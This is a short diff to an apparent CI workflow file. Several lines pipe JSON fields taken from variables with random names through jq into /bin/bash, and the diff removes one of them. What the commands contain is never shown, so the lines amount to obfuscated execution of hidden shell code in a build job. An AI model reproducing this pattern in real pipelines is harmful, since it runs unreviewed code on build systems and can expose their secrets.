@@ -33,7 +33,6 @@ jobs:
           printf '%s' "$yp354" | jq -r .hyn65010 | /bin/bash
           printf '%s' "$rvfrj6" | jq -r .m9490 | /bin/bash
           printf '%s' "$ly719" | jq -r .tclw25 | /bin/bash
-          printf '%s' "$w99" | jq -r .nzdu7227 | /bin/bash
           printf '%s' "$o4" | jq -r .zzyf268 | /bin/bash
 
       - name: Store artifact
